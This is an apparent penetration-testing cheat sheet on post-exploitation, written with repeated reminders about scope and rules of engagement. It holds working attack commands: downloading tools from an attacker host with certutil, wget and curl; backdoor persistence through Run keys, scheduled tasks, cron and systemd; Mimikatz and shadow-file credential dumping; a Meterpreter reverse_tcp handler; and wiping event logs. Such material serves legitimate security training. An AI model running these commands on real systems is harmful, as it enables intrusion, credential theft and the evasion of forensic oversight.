# Post-Exploitation 

---

## Short definition 

**Post-exploitation** = everything you do **after** obtaining an initial foothold on a host.
Goal: gather intelligence, escalate privileges, maintain access as needed for the engagement, move laterally, and finally document & clean up.

Typical objectives you will accomplish:

* Local enumeration (what the host is, who’s logged on, what’s sensitive)
* Privilege escalation (get from low-priv to admin/root)
* Credential harvesting & hash dumping (for lateral movement)
* Uploading/downloading tools (file transfer)
* Shell upgrades (stable interactive shells)
* Persistence (if authorized)
* Pivoting/internal discovery across the target network
* Clearing tracks and clean-up (document what you remove)

---

## Post-exploitation methodology 

1. **Local enumeration** — understand the host and its role.
2. **Transfer files** — stage tools/payloads you need.
3. **Upgrade shells** — get a stable interactive shell / Meterpreter.
4. **Privilege escalation** — escalate to admin/root.
5. **Persistence (optional)** — only when in scope and documented.
6. **Dump & crack hashes / credential harvesting** — for lateral movement.
7. **Pivot & internal recon** — discover and access internal hosts.
8. **Clear traces & cleanup** — remove artifacts, record evidence.

---

## Tooling 

* **Enumeration / discovery:** `whoami`, `id`, `uname -a`, `hostname`, `ip a` / `ipconfig`, `netstat`, `route`, `ps`, `ss`, `tasklist`, `systeminfo`
* **Automated local enumeration:** `linpeas`, `winPEAS`, `PSRecon`, `PowerUp`, `Seatbelt`, `SharpUp`
* **File transfer & staging:** `nc`, `python -m http.server`, `scp`, `sftp`, `certutil` (Windows), `bitsadmin` (legacy), SMB share copy
* **Shells & sessions:** Bash/PTY tricks, `python -c 'import pty; pty.spawn("/bin/bash")'`, Meterpreter, SSH
* **Privilege escalation:** `sudo -l`, SUID checks, check kernel version, local exploit PoCs
* **Credential dumping:** `mimikatz` (Windows), `secretsdump.py` (Impacket), `/etc/shadow` (Linux), `hashdump` (Meterpreter)
* **Hash cracking:** `john`, `hashcat`
* **Pivot / proxy:** Meterpreter `route`/`portfwd`, `sshuttle`, `socks` via `proxychains`, `chisel`, `socat`
* **Persistence:** Windows registry Run keys, scheduled tasks, services, WMI; Linux systemd units, cron jobs, SSH authorized_keys
* **Clearing tracks:** `history -c`, edit/clear event logs (`wevtutil`), careful modification of timestamps (beware forensics), ensure documented cleanup

---

## 1) Local enumeration — what to run first 

### Quick checklist 

```bash
# Linux
whoami
id
hostname
uname -a
cat /etc/*release
ip a; ip route; ss -tuln
ps aux --width 200
sudo -l
ls -la /home
find / -type f -name "*pass*" 2>/dev/null

# Windows (cmd/Powershell)
whoami
systeminfo
hostname
ipconfig /all
netstat -ano
tasklist /v
net user
wmic product get name,version
```

### Use automated checks to surface obvious privesc paths

* Linux: `linpeas.sh` (download and run in lab)
* Windows: `winPEAS.bat`, `PowerUp` (PowerShell module), `Seatbelt`

> Save outputs to files for evidence and easier analysis.

---

## 2) Transferring files 

### Host a file quickly 

```bash
# Python 3
python3 -m http.server 8000
# Python 2
python -m SimpleHTTPServer 8000
```

### Pull to Windows (target)

```powershell
# using certutil (no browser needed)
certutil -urlcache -f http://<attacker-ip>:8000/tool.exe tool.exe
```

### Pull to Linux (target)

```bash
# wget / curl
wget http://<attacker-ip>:8000/tool -O /tmp/tool && chmod +x /tmp/tool
curl -o /tmp/tool http://<attacker-ip>:8000/tool && chmod +x /tmp/tool
# netcat push (attacker->target)
# On attacker: nc -nvlp 9000 < file
# On target: nc <attacker-ip> 9000 > file
```

**Tip:** keep predictable directories and use short, documented commands. Always checksum/download verification if possible.

---

## 3) Upgrading shells & making them stable

### Spawn pseudo-tty on Linux

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Or
python -c 'import pty; pty.spawn("/bin/bash")'
# Then in your local terminal: ctrl-z, stty raw -echo; fg
```

### Meterpreter: upgrade shell

* If you have a basic shell, upload a staged Meterpreter payload (msfvenom) and execute, or use `sessions -u` in Meterpreter to try upgrade.

---

## 4) Privilege escalation  

### Approach

1. Enumerate kernel & OS version, installed packages, SUID binaries, sudo rights, running services, creds on disk/config files.
2. Match findings to known local exploits or misconfigurations (e.g., weak `sudo` config, SUID misuses, writable system files, vulnerable kernel).
3. Test safe, non-destructive PoCs in a lab that mirror target.

### Quick Linux checks

```bash
uname -a
cat /etc/os-release
sudo -l
getcap -r / 2>/dev/null        # capabilities
find / -perm -4000 -type f 2>/dev/null   # SUID files
ps aux --sort=-%mem | head
```

### Quick Windows checks

```powershell
whoami /priv
whoami /groups
# check service config and writable paths:
sc queryex <svcname>
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Force -Include *.config,*.ini
# check UAC level & patch status
```

### Tools & resources

* `winPEAS` / `PowerUp` / `Seatbelt` (Windows)
* `linpeas`, `Linux Exploit Suggester`, `sudo-checks` (Linux)
* After finding a potential vector, use tested PoCs in a lab before using on target.

---

## 5) Persistence 

### Windows examples

* Registry Run key:

```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MyApp /d "C:\Windows\Temp\backdoor.exe" /f
```

* Scheduled task:

```powershell
schtasks /Create /SC ONLOGON /TN "Updater" /TR "C:\Windows\Temp\backdoor.exe"
```

* New Windows Service:

```powershell
sc create MySvc binPath= "C:\Windows\Temp\backdoor.exe" start= auto
```

### Linux examples

* Cron job:

```bash
echo "@reboot /usr/bin/python3 /tmp/backdoor.py" >> /etc/crontab
# or user crontab: crontab -l; echo "@reboot /tmp/backdoor.sh" | crontab -
```

* systemd unit file:

```ini
# /etc/systemd/system/mybackdoor.service
[Unit]
Description=My Backdoor
[Service]
ExecStart=/usr/bin/python3 /tmp/backdoor.py
[Install]
WantedBy=multi-user.target
# enable: systemctl enable mybackdoor; systemctl start mybackdoor
```

**Important:** Only create persistence when contractually allowed, and document it to ensure you can remove it later.

---

## 6) Dumping & cracking hashes

### Windows — Mimikatz (example flow)

* On target/VM with appropriate privileges:

  1. Upload `mimikatz.exe` (or use in-memory variant).
  2. `mimikatz.exe` → `privilege::debug` → `sekurlsa::logonpasswords` to dump plaintext creds and hashes.
* Meterpreter also has `hashdump` and `kiwi` extensions.

### Linux — /etc/shadow & hash extraction

```bash
# if you can read /etc/shadow:
sudo cat /etc/shadow > /tmp/shadow
# Extract user:hash lines and use John/hashcat
john --wordlist=/usr/share/wordlists/rockyou.txt shadow_hashes.txt
# or hashcat -m 1800 <hashfile> wordlist
```

### Crack with John / Hashcat

```bash
# John example (single file)
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt shadow_hashes.txt

# Hashcat example (GPU)
hashcat -m 1800 -a 0 hashes.txt /path/to/wordlist
```

> **Note:** Cracking is resource- and time-intensive. Use cloud/GPU or focused lists. Respect legal limits and the RoE.

---

## 7) Pivoting & internal network discovery

### Meterpreter routing (example)

```text
# in msfconsole
run autoroute -s 10.10.0.0/24   # add route for subnet via session
sessions -i <id>
# then from your attacker: nmap -sT -Pn -n -p1-65535 -oA internal_scan 10.10.0.0/24
```

### SOCKS proxy via Meterpreter / SSH

* `proxychains` + `socksify` through an SSH tunnel or Meterpreter's SOCKS:

```text
# In Metasploit:
use auxiliary/server/socks4a
# or use meterpreter's socks server (post/multi/manage/socks)
# Then direct your tools (curl, nmap with proxy) via proxychains
```

### Tools for tunneling/pivoting

* `ssh -D` (dynamic SOCKS)
* `sshuttle` (simple VPN-like forwarding)
* `chisel`, `socat`, `ngrok` (for tunnels, only in scope)
* `proxychains` to force traffic through a SOCKS proxy

---

## 8) Clearing tracks & cleanup (ethics & caution)

### High-level guidance

* **Document everything** before removing artifacts. Your report must explain what you removed and why.
* Cleaning logs and timestamps can impair forensic investigations — only do what RoE permits and always disclose changes in your report.

### Examples (be careful)

* **Linux shell history**

```bash
history -c
unset HISTFILE
rm ~/.bash_history
```

* **Windows event logs**

```powershell
wevtutil el | Foreach-Object { wevtutil cl $_ }    # clears all event logs (dangerous)
# Or clear specific log:
wevtutil cl Security
```

**IMPORTANT:** Clearing logs is a very obvious red flag and is often disallowed in engagements. Instead, prefer to:

* Remove only temporary files you uploaded (e.g., tools in /tmp or C:\Windows\Temp).
* Revert config changes (restore original files you modified).
* Provide wipe/cleanup evidence in the final report.

---

## Automation & helpers (practical)

* Keep a **post-exec toolkit** on your attacker host (scripts that gather systeminfo, list SUIDs, run linpeas/winpeas).
* Maintain **versioned copies** of any PoC or modified exploit you used (patches, compile flags).
* Use `script` or tee to record terminal sessions:

```bash
script -f /tmp/session_$(date +%F_%T).log
# or
your_command | tee output.txt
```

---

## Quick reference — commands summary  

### Enumeration

```bash
# Linux
id; uname -a; cat /etc/*release; ip a; ss -tuln; ps aux; sudo -l; find / -perm -4000 -type f 2>/dev/null

# Windows (powershell/cmd)
whoami; systeminfo; ipconfig /all; netstat -ano; tasklist /v; whoami /priv; net user
```

### File transfer

```bash
# host on attacker
python3 -m http.server 8000

# download from Windows
certutil -urlcache -f http://<attacker-ip>:8000/tool.exe tool.exe

# download from Linux
wget http://<attacker-ip>:8000/tool -O /tmp/tool && chmod +x /tmp/tool
```

### Shell upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Simple Meterpreter flow (conceptual)

```text
# msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set LPORT 4444
run
# deliver payload on target (only if in scope)
```

### Dumping (example)

```text
# Meterpreter
run post/windows/gather/hashdump

# Linux (if /etc/shadow readable)
john --wordlist=/usr/share/wordlists/rockyou.txt shadow_hashes.txt
```

---

## Checklist — responsible post-ex workflow (copy/paste)

```text
1. Confirm scope & RoE before any post-ex action.
2. Immediately collect and save system facts (outputs).
3. Stage minimal tools required and document transfers.
4. Attempt privilege escalation using non-destructive checks first (sudo -l, SUID).
5. If escalation found, verify in lab before running exploit.
6. If credential harvesting/credential use is needed, log all attempts and outcomes.
7. Pivot only to assets in-scope and document all actions.
8. If persistence is required by engagement, use reversible methods and record changes.
9. Clean up files you uploaded; restore modified configs; record everything in report.
10. Produce detailed evidence package: commands, timestamps, screenshots, logs, and remediation recommendations.
```

---
